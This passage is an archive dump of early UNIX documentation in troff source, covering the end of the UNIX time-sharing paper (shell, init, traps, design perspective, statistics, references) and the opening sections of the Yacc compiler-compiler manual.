assembly takes, the Shell returns immediately.
When the Shell does not wait for
the completion of a command,
the identification of the
process running that command is printed.
This identification may be used to
wait for the completion of the command or to
terminate it.
The ``&'' may be used
several times in a line:
.dc
as source >output & ls >files &
.ec
does both the assembly and the listing in the background.
In the examples above using ``&'', an output file
other than the typewriter was provided; if this had not been
done, the outputs of the various commands would have been
intermingled.
.pg
The Shell also allows parentheses in the above operations.
For example
.dc
(\|date; ls\|) >x &
.ec
prints the current date and time followed by
a list of the current directory onto the file \fIx.\fR
The Shell also returns immediately for another request.
.s2
6.4 The Shell as a Command; Command Files
.es
The Shell is itself a command, and may be called recursively.
Suppose file \fItryout\fR contains the lines
.dc
as source
.ti 1i
mv a.out testprog
.ti 1i
testprog
.ec
The \fImv\fR command causes the file \fIa.out\fR to be renamed \fItestprog.\fR
\fIA.out\fR is the (binary) output of the assembler, ready to be executed.
Thus if the three lines above were typed on the console,
\fIsource\fR would be assembled, the resulting program renamed \fItestprog\fR,
and \fItestprog\fR executed.
When the lines are in \fItryout\fR, the command
.dc
sh <tryout
.ec
would cause the Shell \fIsh\fR to execute the commands
sequentially.
.pg
The Shell has further capabilities, including the
ability to substitute parameters
and
to construct argument lists from a specified
subset of the file names in a directory.
It is also possible to
execute commands conditionally on character string comparisons
or on existence of given files
and to perform transfers of control
within filed command sequences.
.s2
6.5 Implementation of the Shell
.es
The outline of the operation of the Shell can now be understood.
Most of the time, the Shell
is waiting for the user to type a command.
When the
new-line character ending the line
is typed, the Shell's \fIread\fR call returns.
The Shell analyzes the command line, putting the
arguments in a form appropriate for \fIexecute\fR.
Then \fIfork\fR is called.
The child process, whose code
of course is still that of the Shell, attempts
to perform an \fIexecute\fR with the appropriate arguments.
If successful, this will bring in and start execution of the program whose name
was given.
Meanwhile, the other process resulting from the \fIfork\fR, which is the
parent process, \fIwait\|\fRs for the child process to die.
When this happens, the Shell knows the command is finished, so
it types its prompt and reads the typewriter to obtain another
command.
.pg
Given this framework, the implementation of background processes
is trivial; whenever a command line contains ``&'',
the Shell merely refrains from waiting for the process
which it created
to execute the command.
.pg
Happily, all of this mechanism meshes very nicely with
the notion of standard input and output files.
When a process is created by the \fIfork\fR primitive, it
inherits not only the core image of its parent
but also all the files currently open in its parent,
including those with file descriptors 0 and 1.
The Shell, of course, uses these files to read command
lines and to write its prompts and diagnostics, and in the ordinary case
its children_the command programs_inherit them automatically.
When an argument with ``<'' or ``>'' is given however, the
offspring process, just before it performs \fIexecute,\fR
makes the standard I/O
file descriptor 0 or 1 respectively refer to the named file.
This is easy
because, by agreement,
the smallest unused file descriptor is assigned
when a new file is \fIopen\fR\|ed
(or \fIcreate\fR\|d);
it is only necessary to close file 0 (or 1)
and open the named file.
Because the process in which the command program runs simply terminates
when it is through, the association between a file
specified after ``<'' or ``>'' and file descriptor 0 or 1 is ended
automatically when the process dies.
Therefore
the Shell need not know the actual names of the files
which are its own standard input and output, since it need
never reopen them.
.pg
Filters are straightforward extensions
of standard I/O redirection with pipes used
instead of files.
.pg
In ordinary circumstances, the main loop of the Shell never
terminates.
(The main loop includes that
branch of the return from \fIfork\fR belonging to the
parent process; that is, the branch which does a \fIwait\fR, then
reads another command line.)
The one thing which causes the Shell to terminate is
discovering an end-of-file condition on its input file.
Thus, when the Shell is executed as a command with
a given input file, as in
.dc
sh <comfile
.ec
the commands in \fIcomfile\fR will be executed until
the end of \fIcomfile\fR is reached; then the instance of the Shell
invoked by \fIsh\fR will terminate.
Since this Shell process
is the child of another instance of the Shell, the \fIwait\fR
executed in the latter will return, and another
command may be processed.
.s2
6.6 Initialization
.es
The instances of the Shell to which users type
commands are themselves children of another process.
The last step in the initialization of \*sUNIX\*n is the creation of
a single process and the invocation (via \fIexecute\fR)
of a program called \fIinit\fR.
The role of \fIinit\fR is to create one process
for each typewriter channel which may be dialed up by a user.
The various subinstances of \fIinit\fR open the appropriate typewriters
for input and output.
Since when \fIinit\fR was invoked there were
no files open, in each process the typewriter keyboard will
receive file descriptor 0 and the printer file descriptor 1.
Each process types out a message requesting that the user log in
and waits, reading the typewriter, for a reply.
At the outset, no one is logged in,
so each process simply hangs.
Finally someone types his name or other identification.
The appropriate instance of \fIinit\fR wakes up, receives the log-in
line, and reads a password file.
If the user name is found, and if
he is able to supply the correct password, \fIinit\fR
changes to the user's default current directory, sets
the process's user \*sID\*n to that of the person logging in, and performs
an \fIexecute\fR of the Shell.
At this point the Shell is ready to receive commands
and the logging-in protocol is complete.
.pg
Meanwhile, the mainstream path of \fIinit\fR (the parent of all
the subinstances of itself which will later become Shells)
does a \fIwait\fR.
If one of the child processes terminates, either
because a Shell found an end of file or because a user
typed an incorrect name or password, this path of \fIinit\fR
simply recreates the defunct process, which in turn reopens the appropriate
input and output files and types another login message.
Thus a user may log out simply by typing the end-of-file
sequence in place of a command to the Shell.
.s2
6.7 Other programs as Shell
.es
The Shell as described above is designed to allow users
full access to the facilities of the system, since it will
invoke the execution of any program
with appropriate protection mode.
Sometimes, however, a different interface to the system
is desirable, and this feature is easily arranged.
.pg
Recall that after a user has successfully logged in by supplying
his name and password, \fIinit\fR ordinarily invokes the Shell
to interpret command lines.
The user's entry
in the password file may contain the name
of a program to be invoked after login instead of the Shell.
This program is free to interpret the user's messages
in any way it wishes.
.pg
For example, the password file entries
for users of a secretarial editing system
specify that the
editor \fIed\fR is to be used instead of the Shell.
Thus when editing system users log in, they are inside the editor and
can begin work immediately; also, they can be prevented from
invoking \*sUNIX\*n programs not intended for their use.
In practice, it has proved desirable to allow a temporary
escape from the editor
to execute the formatting program and other utilities.
.pg
Several of the games (e.g., chess, blackjack, 3D tic-tac-toe)
available on \*sUNIX\*n illustrate
a much more severely restricted environment.
For each of these an entry exists
in the password file specifying that the appropriate game-playing
program is to be invoked instead of the Shell.
People who log in as a player
of one of the games find themselves limited to the
game and unable to investigate the presumably more interesting
offerings of \*sUNIX\*n as a whole.
-- /usr/doc/unix/p5 mode=0110664 uid=3 gid=3 atime=170468727 mtime=173059679 --
.s1
7. Traps
.es
The \*sPDP\*n-11 hardware detects a number of program faults,
such as references to non-existent memory, unimplemented instructions,
and odd addresses used where an even address is required.
Such faults cause the processor to trap to a system routine.
When an illegal action is caught,
unless other arrangements have been made,
the system terminates the process and writes the
user's image
on file \fIcore\fR in the current directory.
A debugger can be used to determine
the state of the program at the time of the fault.
.pg
Programs which are looping, which produce unwanted output, or about which
the user has second thoughts may be halted by the use of the
.ft I
interrupt
.ft R
signal, which is generated by typing the ``delete''
character.
Unless special action has been taken, this
signal simply causes the program to cease execution
without producing a core image file.
.pg
There is also a \fIquit\fR signal which
is used to force a core image to be produced.
Thus programs which loop unexpectedly may be
halted and the core image examined without prearrangement.
.pg
The hardware-generated faults
and the interrupt and quit signals
can, by request, be either ignored or caught by the process.
For example,
the Shell ignores quits to prevent
a quit from logging the user out.
The editor catches interrupts and returns
to its command level.
This is useful for stopping long printouts
without losing work in progress (the editor
manipulates a copy of the file it is editing).
In systems without floating point hardware,
unimplemented instructions are caught
and floating point instructions are
interpreted.
.s1
8. Perspective
.es
Perhaps paradoxically,
the success of \*sUNIX\*n
is largely due to the fact that it was not
designed to meet any
predefined objectives.
The first version was written when one of us
(Thompson),
dissatisfied with the available computer facilities,
discovered a little-used \*sPDP\*n-7
and set out to create a more
hospitable environment.
This essentially personal effort was
sufficiently successful
to gain the interest of the remaining author
and others,
and later to justify the acquisition
of the \*sPDP\*n-11/20, specifically to support
a text editing and formatting system.
When in turn the 11/20 was outgrown,
\*sUNIX\*n
had proved useful enough to persuade management to
invest in the \*sPDP\*n-11/45.
Our goals throughout the effort,
when articulated at all, have always concerned themselves
with building a comfortable relationship with the machine
and with exploring ideas and inventions in operating systems.
We have not been faced with the need to satisfy someone
else's requirements,
and for this freedom we are grateful.
.pg
Three considerations which influenced the design of \*sUNIX\*n
are visible in retrospect.
.pg
First:
since we are programmers,
we naturally designed the system to make it easy to
write, test, and run programs.
The most important expression of our desire for
programming convenience
was that the system
was arranged for interactive use,
even though the original version only
supported one user.
We believe that a properly-designed
interactive system is much more
productive
and satisfying to use than a ``batch'' system.
Moreover such a system is rather easily
adaptable to non-interactive use, while the converse is not true.
.pg
Second:
there have always been fairly severe size constraints
on the system and its software.
Given the partially antagonistic desires for reasonable efficiency and
expressive power,
the size constraint has encouraged
not only economy but a certain elegance of design.
This may be a thinly disguised version of the ``salvation
through suffering'' philosophy,
but in our case it worked.
.pg
Third: nearly from the start, the system was able to, and did, maintain itself.
This fact is more important than it might seem.
If designers of a system are forced to use that system
they quickly become aware of its functional and superficial deficiencies
and are strongly motivated to correct them before it is too late.
Since all source programs were always available
and easily modified on-line,
we were willing to revise and rewrite the system and its software
when new ideas were invented, discovered,
or suggested by others.
.pg
The aspects of \*sUNIX\*n
discussed in this paper exhibit clearly
at least the first two of these
design considerations.
The interface to the file
system, for example, is extremely convenient from
a programming standpoint.
The lowest possible interface level is designed
to eliminate distinctions
between
the various devices and files and between
direct and sequential access.
No large ``access method'' routines
are required
to insulate the programmer from the
system calls;
in fact all user programs either call the system
directly or
use a small library program, only tens of instructions long,
which buffers a number of characters
and reads or writes them all at once.
.pg
Another important aspect of programming
convenience is that there are no ``control blocks''
with a complicated structure partially maintained by
and depended on by the file system or other system calls.
Generally speaking, the contents of a program's address space
are the property of the program, and we have tried to
avoid placing restrictions
on the data structures within that address space.
.pg
Given the requirement
that all programs should be usable with any file or
device as input or output,
it is also desirable
from a space-efficiency standpoint
to push device-dependent considerations
into the operating system itself.
The only alternatives seem to be to load
routines for dealing with each device
with all programs, which is expensive in space,
or to depend on some means of dynamically linking to
the routine appropriate to each device when it is actually
needed,
which is expensive either in overhead or in hardware.
.pg
Likewise,
the process control scheme and command interface
have proved both convenient and efficient.
Since the Shell operates as an ordinary, swappable
user program,
it consumes no wired-down space in the system proper,
and it may be made as powerful as desired
at little cost.
In particular,
given the framework in which the Shell executes
as a process which spawns other processes to
perform commands,
the notions of I/O redirection, background processes,
command files, and user-selectable system interfaces
all become essentially trivial to implement.
.s2
8.1 Influences
.es
The success of \*sUNIX\*n lies
not so much in new inventions
but rather in the full exploitation of a carefully selected
set of fertile ideas,
and especially in showing that
they can be keys to the implementation of a small
yet powerful operating system.
.pg
The
.it fork
operation, essentially as we implemented it, was
present in the Berkeley time sharing system\*r.
On a number of points we were influenced by Multics,
which suggested the particular form of the I/O system calls\*r
and both the name of the Shell and its general functions.
The notion that the Shell should create a process
for each command was also suggested to us by
the early design of Multics, although in that
system it was later dropped for efficiency reasons.
A similar scheme is used by \*sTENEX\*n\*r.
-- /usr/doc/unix/p6 mode=0100664 uid=3 gid=3 atime=170468729 mtime=173059679 --
.s1
9. Statistics
.es
The following numbers
are presented to suggest the scale of our operation.
Those of our users
not involved in document preparation
tend to use the system for
program development, especially language work.
There are few important
``applications'' programs.
.pg
Overall, we have
.pg
.ta .5i 1.25i
.ti 0
.nf
	100	user population
	14	maximum simultaneous users
	380	directories
	4800	files
	66300	512-byte secondary storage blocks used
.fi
.pg
There is a ``background'' process that
runs at the lowest possible priority; it is used
to soak up any idle \*sCPU\*n time.
It has been used to produce a million-digit
approximation to the constant \fIe\fR\(mi2,
and is now solving all rook-and-pawn vs. rook chess
endgames.
Not counting this background work, we average daily
.pg
.nf
.ti 0
	2400	commands
	5.5	\*sCPU\*n hours
	100	connect hours
	32	different users
	100	logins
.fi
.pg
.pg
.ti 0
.ft I
Acknowledgements.
.ft R
We are grateful to R.H. Canaday, L.L. Cherry,
and L.E. McMahon
for their contributions to
\*sUNIX\*n.
We are particularly appreciative
of the inventiveness,
thoughtful criticism,
and constant support of
R. Morris, M.D. McIlroy,
and J.F. Ossanna.
.pg
.pg
.ti 0
.ft B
References
.ft R
.br
.in 3
.ta 3
.nr r 0 1
.ti 0
\n+r.	Digital Equipment Corporation.
.ft I
\*sPDP\*n-11/40 Processor Handbook \fR(1972),
.ft R
.ft I
\*sPDP\*n-11/45 Processor Handbook \fR(1971),
.ft R
and
.ft I
\*sPDP\*n-11/70 Processor Handbook \fR(1975).
.br
.ti 0
\n+r.	Deutsch, L.P., and Lampson, B.W.
An online editor.
.ft I
Comm. ACM 10,
.ft R
12 (Dec. 1967),
793-799, 803.
.br
.ti 0
\n+r.	Richards, M.
\*sBCPL\*n: A tool for compiler writing
and system programming.
Proc. AFIPS 1969 SJCC, Vol. 34,
AFIPS Press, Montvale, N.J., pp. 557-566.
.br
.ti 0
\n+r.	McClure, R.M.
\*sTMG\*n\(emA syntax directed compiler.
Proc. ACM 20th Nat. Conf.,
ACM, 1965, New York,
pp. 262-274.
.br
.ti 0
\n+r.	Hall, A.D.
The M6 macroprocessor.
Computing Science Tech. Rep. #2,
Bell Telephone Laboratories,
1969.
.br
.ti 0
\n+r.	Ritchie, D.M.  C reference manual. Unpublished memorandum,
Bell Telephone Laboratories (1973).
.br
.ti 0
\n+r.	Aleph-null. Computer Recreations.
.ft I
Software Practice and Experience 1, \fR2
(Apr.-June 1971), 201-204.
.br
.ti 0
\n+r.	Deutch, L.P. and Lampson, B.W.
\*sSDS\*n 930 time-sharing system
preliminary reference manual.
Doc. 30.10.10, Project \*sGENIE\*n,
Univ. Cal. at Berkeley (Apr. 1965).
.br
.ti 0
\n+r.	Feiertag, R.J., and Organick, E.I.
The Multics input-output system.
Proc. Third Symposium on Operating Systems Principles.
Oct. 18-20, 1971,
ACM, New York, pp. 35-41.
.br
.ti 0
\n+r.	Bobrow, D.G., Burchfiel, J.D., Murphy, D.L., and
Tomlinson, R.S.
\*sTENEX\*n, a paged time sharing system for the \*sPDP\*n-10.
.ft I
Comm. ACM 15.,
.ft R
3 (March 1972) 135-143.
-- /usr/doc/yacc mode=0140775 uid=3 gid=3 atime=173059688 mtime=173059507 --
-- /usr/doc/yacc/rpss mode=0100664 uid=3 gid=3 atime=173059264 mtime=173059689 --
.RP
.TL
YACC \- Yet Another Compiler-Compiler
.AU
Stephen C. Johnson
.AI
.MH
.AB
Computer program input generally has some structure;
in fact, every computer program which does input can be thought of as defining
an ``input language'' which it accepts.
The input languages may be as complex as a programming language, or as simple as
a sequence of numbers.
Unfortunately, standard input facilities
are restricted, difficult to use and change,
and do not completely check their inputs for validity.
.PP
Yacc provides a general tool for controlling
the input to a computer program.
The Yacc user describes the structures
of his input, together with code which is to be invoked when
each such structure is recognized.
Yacc turns such a specification into a subroutine which may
be invoked to handle the input process;
frequently, it is convenient and appropriate to have most
of the flow of control in the user\'s application
handled by this subroutine.
.PP
The input subroutine produced by Yacc calls a user supplied routine to
return the next basic input item.
Thus, the user can specify his input in terms of individual input characters, or, if he wishes,
in terms of higher level constructs such as names and numbers.
The user supplied routine may also handle idiomatic features such as
comment and continuation conventions, which typically defy easy specification.
.PP
Yacc is written in C[7], and runs under UNIX.
The subroutine which is output may be in C or in Ratfor[4], at the user\'s choice;
Ratfor permits translation of the output subroutine into portable Fortran[5].
The class of specifications accepted is a very general one, called LALR(1)
grammars with disambiguating rules.
The theory behind Yacc has been described elsewhere[1,2,3].
.PP
Yacc was originally designed to help produce the ``front end'' of
compilers; in addition to this use, it has been successfully used in many application
programs, including a phototypesetter language, a document retrieval system,
a Fortran debugging system, and the Ratfor compiler.
.AE
-- /usr/doc/yacc/ss0 mode=0110664 uid=3 gid=3 atime=173059266 mtime=173059689 --
.SH
Section 0: Introduction
.PP
Yacc provides a general tool for imposing structure on the input to a computer program.
The Yacc user prepares a
specification of the input process; this includes rules
which describe the input structure, code which is to be invoked when these
structures are recognized, and a low-level routine to do the
basic input.
Yacc then produces a subroutine to do the input procedure;
this subroutine, called a
.I
parser,
.R
calls the user-supplied low-level input routine
(called the
.I
lexical analyzer)
.R
to pick up the basic items
(called
.I
tokens)
.R
from the input stream.
These tokens are organized according to the input structure rules,
called
.I
grammar rules;
.R
when one of these rules has been recognized,
then the user code supplied for this rule, called an
.I
action,
.R
is invoked; actions have the ability to return values and
make use of the values of other actions.
.PP
The heart of the input specification is a collection of grammar rules.
Each rule describes an allowable structure and gives it a name.
For example, one grammar rule might be
.DS
date  :  month\_name  day  \',\'  year   ;
.DE
Here, date, month\_name, day, and year represent structures of interest in the input process;
presumably, month\_name, day, and year are defined elsewhere.
The comma ``,'' is quoted by single quotes; this implies that the
comma is to appear literally in the input.
The colon and semicolon merely serve as punctuation in the rule, and have
no significance in controlling the input.
Thus, with proper definitions, the input
.DS
July  4, 1776
.DE
might be matched by the above rule.
.PP
As we mentioned above, an important part of the input process is carried out by the
lexical analyzer.
This user routine reads the true input stream, recognizing those
structures which are more conveniently or more
efficiently recognized directly, and communicates these recognized tokens
to the parser.
For historical reasons, the name of a structure recognized by the lexical analyzer is called a
.I
terminal symbol
.R
name, while the name of a structure recognized by the parser is called a
.I
nonterminal symbol
.R
name.
To avoid the obvious confusion of terminology, we shall usually refer to
terminal symbol names as
.I
token names.
.R
.PP
There is considerable leeway in deciding whether to recognize structures by the lexical
analyzer or by a grammar rule.
Thus, in the above example it would be possible to have other rules of the form
.DS
month\_name  :  \'J\' \'a\' \'n\'   ;
month\_name  :  \'F\' \'e\' \'b\'   ;

         . . .

month\_name  :  \'D\' \'e\' \'c\'   ;
.DE
Here, the lexical analyzer would only need to recognize individual letters, and
month\_name would be a nonterminal symbol.
Rules of this sort tend to be a bit wasteful of time and space, and may
even restrict the power of the input process
(although they are easy to write).
For a more efficient input process, the lexical analyzer itself might
recognize the month names,
and return an indication that a
month\_name was seen; in this case, month\_name would be a token.
.PP
Literal characters, such as ``,'', must also be passed through the lexical
analyzer, and are considered tokens.
.PP
As an example of the flexibility of the grammar rule approach, we might add to the above
specifications the rule
.DS
date  :  month \'/\' day \'/\' year   ;
.DE
and thus optionally allow the form
.DS
7/4/1776
.DE
as a synonym for
.DS
July 4, 1776
.DE
In most cases, this new rule could be ``slipped in'' to a working system with minimal effort,
and a very small chance of disrupting existing input.
.PP
Frequently, the input being read does not conform to the
specifications due to errors in the
input.
The parsers produced by Yacc have
the very desirable property that they will detect these
input errors at the earliest
place at which this can be done with a
left-to-right scan;
thus, not only is the chance of reading and computing with bad
input data substantially reduced, but the bad data can usually be quickly found.
Error handling facilities,
entered as part of the input specifications, frequently
permit the reentry of bad data,
or the continuation of the input process after skipping over the bad data.
.PP
In some cases, Yacc fails to produce a parser when given a set of
specifications.
For example, the specifications may be self contradictory, or they may
require a more powerful recognition mechanism than that available to Yacc.
The former cases probably represent true design errors;
the latter cases
can often be corrected
by making
the lexical analyzer
more powerful, or by rewriting some of the grammar rules.
The class of specifications which Yacc can handle compares very favorably
with other systems of this type; moreover, the
constructions which are difficult for Yacc to handle are
also frequently difficult for human beings to handle.
Some users have reported that the discipline of formulating valid
Yacc specifications for their input revealed errors of
conception or design early in the program development.
.PP
The next several sections describe the
basic process of preparing a Yacc specification;
Section 1 describes the preparation of grammar rules,
Section 2 the preparation of the user supplied actions associated with these rules,
and Section 3 the preparation of lexical analyzers.
In Section 4, we discuss the
diagnostics produced when Yacc
is unable to produce a parser
from the given specifications.
This section also describes a simple, frequently useful mechanism for
handling operator precedences.
Section 5 discusses error detection and recovery.
Sections 6C and 6R discuss the operating environment and special features
of the subroutines which Yacc produces in C and Ratfor, respectively.
Section 7 gives some hints which
may lead to better designed, more efficient,
and clearer specifications.
Finally, Section 8 has a brief summary.
Appendix A has a brief example, and Appendix B tells how to run Yacc on
the UNIX operating system.
Appendix C has a brief description of mechanisms and syntax
which are no longer actively supported, but which
are provided for historical continuity with older versions of Yacc.
-- /usr/doc/yacc/ss1 mode=0110664 uid=3 gid=3 atime=173059267 mtime=173059689 --
.SH
Section 1: Basic Specifications
.PP
As we noted above, names refer to either tokens or nonterminal symbols.
Yacc requires those names which will be
used as token names to be declared as such.
In addition, for reasons which will be discussed in Section 3, it is usually desirable
to include the lexical analyzer as part of the specification file;
it may be useful to include other programs as well.
Thus, every specification file consists of three sections:
the
.ul
declarations,
.ul
(grammar) rules,
and
.ul
programs.
The sections are separated by double percent ``%%'' marks.
(The per-cent ``%'' is generally used in Yacc specifications as an escape character.)
.PP
In other words, a full specification file looks like
.DS
declarations
%%
rules
%%
programs
.DE
.PP
The declaration section may be empty.
Moreover, if the programs section is omitted, the second %% mark may be omitted also;
thus, the smallest legal Yacc specification is
.DS
%%
rules
.DE
.PP
Blanks, tabs, and newlines are ignored except
that they may not appear in names or multi-character reserved symbols.
Comments may appear wherever a name or operator is legal; they are enclosed
in /* . . . */, as in C and PL/I.
.PP
The rules section is made up of one or more grammar rules.
A grammar rule has the form:
.DS
A  :  BODY  ;
.DE
A represents a nonterminal name, and BODY represents a sequence of zero or more names and literals.
Notice that the colon and the semicolon are Yacc punctuation.
.PP
Names may be of arbitrary length, and may be made up of letters, dot ``.'', underscore ``\_'', and
non-initial digits.
Notice that Yacc considers that upper and lower case letters are distinct.
The names used in the body of a grammar rule may represent tokens or nonterminal symbols.
.PP
A literal consists of a character enclosed in single quotes ``\'''.
As in C, the backslash ``\e'' is an escape character within literals, and all the C escapes
are recognized.
Thus
.DS
\'\en\'	represents newline
\'\er\'	represents return
\'\e\'\'	represents single quote ``\'''
\'\e\e\'	represents backslash ``\e''
\'\et\'	represents tab
\'\eb\'	represents backspace
\'\exxx\' represents ``xxx'' in octal
.DE
For a number of technical reasons, the nul character (\'\e0\' or 000) should never
be used in grammar rules.
.PP
If there are several grammar rules with the same left hand side, the vertical bar ``|''
can be used to avoid rewriting the left hand side.
In addition,
the semicolon at the end of a rule can be dropped before a vertical bar.
Thus the grammar rules
.DS
A : B C D   ;
A : E F   ;
A : G   ;
.DE
can be given to Yacc as
.DS
A :	B C D |
	E F |
	G ;
.DE
It is not necessary that all grammar rules with the same left side appear together in the grammar rules section,
although it makes the input much more readable, and easy to change.
.PP
If a nonterminal symbol matches the empty string, this can be indicated in the obvious way:
.DS
empty :   ;
.DE
.PP
As we mentioned above, names which represent
tokens must be declared as such.
The simplest way of doing this is to write
.DS
%token   name1 name2 . . .
.DE
in the declarations section.
(See Sections 3 and 4 for much more discussion).
Every name not defined in the declarations section is assumed to represent a nonterminal symbol.
If, by the end of the rules section, some nonterminal symbol has not appeared on the left
of any rule, then an error message is produced and Yacc halts.
.PP
The left hand side of the
.I
first
.R
grammar rule in the grammar rules section has special importance; it is taken to be the
controlling nonterminal symbol for the entire input process;
in technical language it is called the
.I
start symbol.
.R
In effect, the parser is designed to recognize the start symbol; thus,
this symbol generally represents the largest,
most general structure described by the grammar rules.
.PP
The end of the input is signaled by a special token, called the
.ul
endmarker.
If the tokens up to, but not including, the endmarker form a structure
which matches the start symbol, the parser subroutine returns to its caller
when the endmarker is seen; we say that it
.ul
accepts
the input.
If the endmarker is seen in any other context, it is an error.
.PP
It is the job of the user supplied lexical analyzer
to return the endmarker when appropriate; see section 3, below.
Frequently, the endmarker token represents some reasonably obvious 
I/O status, such as ``end-of-file'' or ``end-of-record''.
-- /usr/doc/yacc/ss2 mode=0110664 uid=3 gid=3 atime=173059269 mtime=173059689 --
.SH
Section 2: Actions
.PP
To each grammar rule, the user may associate an action to be performed each time
the rule is recognized in the input process.
This action may return a value, and may obtain the values returned by previous
actions in the grammar rule.
In addition, the lexical analyzer can return values
for tokens, if desired.
.PP
When invoking Yacc, the user specifies a programming language; currently, Ratfor and C are supported.
An action is an arbitrary statement in this language, and as such can do
input and output, call subprograms, and alter
external vectors and variables (recall that a ``statement'' in both C and Ratfor can be compound
and do many distinct tasks).
An action is specified by an equal sign ``=''
at the end of a grammar rule, followed by
one or more statements, enclosed in curly braces ``{'' and ``}''.
For example,
.DS
A: \'(\' B \')\' = { hello( 1, "abc" );  }
.DE
and
.DS
XXX: YYY ZZZ =
	{
		printf("a message\en");
		flag = 25;
	}
.DE
are grammar rules with actions in C.
A grammar rule with an action need not end with a semicolon; in fact, it is an error to have a semicolon
before the equal sign.
.PP
To facilitate easy communication between the actions and the parser, the action statements are altered
slightly.
The symbol ``dollar sign'' ``$'' is used as a signal to Yacc in this context.
.PP
To return a value, the action normally sets the
pseudo-variable ``$$'' to some integer value.
For example, an action which does nothing but return the value 1 is
.DS
= { $$ = 1; }
.DE
.PP
To obtain the values returned by previous actions and the lexical analyzer, the
action may use the (integer) pseudo-variables $1, $2, . . .,
which refer to the values returned by the
components of the right side of a rule, reading from left to right.
Thus, if the rule is
.DS
A: B C D ;
.DE
for example, then $2 has the value returned by C, and $3 the value returned by D.
.PP
As a more concrete example, we might have the rule
.DS
expression: \'(\' expression \')\' ;
.DE
We wish the value returned by this rule to be the value of the expression in parentheses.
Then we write
.DS
expression: \'(\' expression \')\'    = { $$ = $2 ; }
.DE
.PP
As a default, the value of a rule is the value of the first element in it ($1).
This is true even if there is no explicit action given for the rule.
Thus, grammar rules of the form
.DS
A: B ;
.DE
frequently need not have an explict action.
.PP
Notice that, although the values of actions are integers, these integers may in fact
contain pointers (in C) or indices into an array (in Ratfor); in this way,
actions can return and reference more complex data structures.
.PP
Sometimes, we wish to get control before a rule is fully parsed, as well as at the
end of the rule.
There is no explicit mechanism in Yacc to allow this; the same effect can be obtained, however,
by introducing a new symbol which matches the empty string, and inserting an action for this symbol.
For example, we might have a rule describing an ``if'' statement:
.DS
statement: IF \'(\' expr \')\' THEN statement
.DE
Suppose that we wish to get control after seeing the right parenthesis
in order to output some code.
We might accomplish this by the rules:
.DS
statement:  IF \'(\' expr \')\' actn THEN statement 
	= { call action1 }

actn:   /* matches the empty string */
	= { call action2 }
.DE
.PP
Thus, the new nonterminal symbol actn matches no input, but serves only to call action2 after the
right parenthesis is seen.
.PP
Frequently, it is more natural in such cases to break the rule into
parts where the action is needed.
Thus, the above example might also have been written
.DS
statement:  ifpart THEN statement
	= { call action1 }

ifpart:      IF \'(\' expr \')\'
	= { call action2 }
.DE
.PP
In many applications, output is not done directly by the actions;
rather, a data structure, such as a parse tree, is constructed in memory,
and transformations are applied to it before output is generated.
Parse trees are particularly easy to
construct, given routines which build and maintain the tree
structure desired.
For example, suppose we have a C function
``node'', written so that the call
.DS
node( L, n1, n2 )
.DE
creates a node with label L, and descendants n1 and n2, and returns a pointer
to the newly created node.
Then we can cause a parse tree to be built by supplying actions such as:
.DS
expr: expr \'+\' expr 
	= { $$ = node( \'+\', $1, $3 ); }
.DE
in our specification.
.PP
The user may define other variables to be used by the actions.
Declarations and definitions can appear in two places in the
Yacc specification: in the declarations section, and at the head of the rules sections, before the
first grammar rule.
In each case, the declarations and definitions are enclosed in the marks ``%{'' and ``%}''.
Declarations and definitions placed in the declarations section have global scope, 
and are thus known to the action statements and the lexical analyzer.
Declarations and definitions placed at the head of the rules section have scope local to
the action statements.
Thus, in the above example, we might have included
.DS
%{ int variable 0; %}
.DE
in the declarations section, or, perhaps,
.DS
%{ static int variable; %}
.DE
at the head of the rules section.
If we were writing Ratfor actions, we might want to include some
COMMON statements at the beginning of the rules section, to allow for
easy communication between the actions and other routines.
For both C and Ratfor, Yacc has used only external names beginning in ``yy'';
the user should avoid such names.
-- /usr/doc/yacc/ss3 mode=0100664 uid=3 gid=3 atime=173059270 mtime=173059689 --
.SH
Section 3: Lexical Analysis
.PP
The user must supply a lexical analyzer which reads the input stream and communicates tokens
(with values, if desired) to the parser.
The lexical analyzer is an integer valued function called yylex, in both C and Ratfor.
The function returns an integer which represents the type of the token.
The value to be associated in the parser with that token is
assigned to the integer variable yylval.
Thus, a lexical analyzer written in C should begin
.DS
yylex ( ) {
	extern int yylval;
	. . .
.DE
while a lexical analyzer written in Ratfor should begin
.DS
integer function yylex(yylval)
	integer yylval
	. . .
.DE
.PP
Clearly, the parser and the lexical analyzer must agree on the type numbers in order for
communication between them to take place.
These numbers may be chosen by Yacc, or chosen by the user.
In either case, the ``define'' mechanisms of C and Ratfor are used to allow the lexical analyzer
to return these numbers symbolically.
For example, suppose that the token name DIGIT has been defined in the declarations section of the
specification.
The relevant portion of the lexical analyzer (in C) might look like:
.DS
yylex( ) {
	extern int yylval;
	int c;
	. . .
	c = getchar( );
	. . .
	if( c >= \'0\' && c <= \'9\' ) {
		yylval = c\-\'0\';
		return(DIGIT);
	}
	. . .
.DE
.PP
The relevant portion of the Ratfor lexical analyzer might look like:
.DS
integer function yylex(yylval)
	integer yylval, digits(10), c
	. . .
	data digits(1) / "0" /;
	data digits(2) / "1" /;
	. . .
	data digits(10) / "9" /;
	. . .
#   set c to the next input character
	. . .
	do i = 1, 10 {
		if(c .EQ. digits(i)) {
			yylval = i\-1
			yylex = DIGIT
			return
		}
	}
	. . .
.DE
.PP
In both cases, the intent is to return a token type of DIGIT, and a value equal to the numerical value of the
digit.
Provided that the lexical analyzer code is placed in the programs section of the specification,
the identifier DIGIT will be redefined to be equal to the type number associated
with the token name DIGIT.
.PP
This mechanism leads to clear
and easily modified lexical analyzers; the only pitfall is that it makes it
important to avoid using any names in the grammar which are reserved
or significant in the chosen language; thus, in both C and Ratfor, the use of
token names of ``if'' or ``yylex'' will almost certainly cause severe
difficulties when the lexical analyzer is compiled.
The token name ``error'' is reserved for error handling, and should not be used naively
(see Section 5).
.PP
As mentioned above, the type numbers may be chosen by Yacc or by the user.
In the default situation, the numbers are chosen by Yacc.
The default type number for a literal
character is the numerical value of the character, considered as a 1 byte integer.
Other token names are assigned type numbers
starting at 257.
It is a difficult, machine dependent
operation to determine the numerical value of an input character
in Ratfor (or Fortran).
Thus, the Ratfor user of Yacc will probably wish
to set his own type numbers, or not use any literals in his specification.
.PP
To assign a type number to a token (including literals),
the first appearance of the token name or literal
.I
in the declarations section
.R
can be immediately followed by
a nonnegative integer.
This integer is taken to be the type number of the name or literal.
Names and literals not defined by this mechanism retain their default definition.
It is important that all type numbers be distinct.
.PP
There is one exception to this situation.
For sticky historical reasons, the endmarker must have type
number 0.
Note that this is not unattractive in C, since the nul character is returned upon
